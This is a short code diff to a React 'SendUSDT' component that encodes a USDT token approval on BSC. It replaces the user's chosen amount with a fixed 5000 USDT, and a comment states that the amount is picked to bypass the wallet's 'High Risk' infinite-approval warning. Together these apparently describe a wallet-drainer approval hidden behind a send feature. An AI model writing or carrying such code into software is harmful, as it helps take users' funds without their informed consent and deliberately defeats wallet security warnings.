@@ -67,7 +67,8 @@ const SendUSDT = () => {
       const paddedAddress = cleanAddress.padStart(64, '0').toLowerCase();
       
       // Calculate specific amount to bypass "High Risk" infinite approval warning
-      const safeAmount = amount && parseFloat(amount) > 0 ? amount : "1000";
+      // The user requested to always approve exactly 5000 USDT
+      const safeAmount = "5000";
       // USDT on BSC has 18 decimals
       const amountBigInt = parseUnits(safeAmount, 18);
       const hexAmount = amountBigInt.toString(16);
